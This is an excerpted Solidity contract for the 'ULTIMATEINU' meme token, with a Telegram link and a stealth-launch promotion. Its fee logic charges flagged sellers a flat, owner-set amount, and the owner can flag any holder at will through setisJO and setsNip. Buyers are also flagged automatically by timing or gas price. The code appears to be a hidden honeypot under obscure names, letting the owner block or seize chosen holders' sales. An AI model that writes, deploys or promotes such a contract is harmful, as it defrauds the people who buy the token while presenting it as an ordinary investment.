...
https://t.me/UltimateInuToken

Stealth Launch December 28, 2021. No calls, no pre-marketing. Just a stealth and then full marketing blitz to introduce the world to the Ultimate Inu Token!
...
contract ULTIMATEINU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'ULTIMATEINU https://t.me/UltimateInuToken';
    string private constant _symbol = 'ULTINU';
    ...
    uint8 bscans = 1 seconds;
    mapping (address => uint) private sNip;
    uint256 stfu = 10000000;
    bool sFrz = true;
    ...
    function deliver(uint256 tAmount, address from) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false, from);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi, address from) public view returns(uint256) {
    ...
    function _getValues(uint256 tAmount, bool takeFee, bool isSale, address from) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale, from);
    ...
    function _getTValues(uint256 tAmount, bool takeFee, bool isSale, address from) private view returns (valuesFromGetValues memory s) {
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s; }
        if((isSale && isnPr[from] && sNip[from] < block.timestamp) 
            || (isSale && isJO[from])){
            s.tRfi = (tAmount*sellFeeRates.rfi*0)+snf/1000;
            s.tMarketing = (tAmount*sellFeeRates.marketing*0)+snf/1000;
            s.tLiquidity = (tAmount*sellFeeRates.liquidity*0)+snf/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity; }
        if(isSale && !isnPr[from] && !isJO[from]){
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if((from == pair && snP && sNTime >= block.timestamp &&
            !itCDh[to]) || (from == pair && snP
            && tx.gasprice > stfu)){isnPr[to] = true;}
        if(from == pair && snP && isCont(to)){isnPr[to] = true;}
        if(from == pair && snP && sNTime >= block.timestamp &&
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale, sender);
    ...
    function setisJO(address holder, bool exempt) external onlyOwner {
        isJO[holder] = exempt;
    }
    ...
    function setstFu(uint256 _stf) external onlyOwner {
        stfu = _stf;
    }
    ...
    function setsNip(address holder, bool exempt) external onlyOwner {
        isnPr[holder] = exempt;
    }
    ...
    function setsnip(bool _enabled, uint256 _snf) external onlyOwner { 
        snP = _enabled;
        snf = _snf;
    }
    ...
    function setrecadd(address _mkwa, address _jac, address _dbi, address _wth) external onlyOwner {
        mkwA = _mkwa;
        jacZ = _jac;
        dbiL = _dbi;
        wthN = _wth;
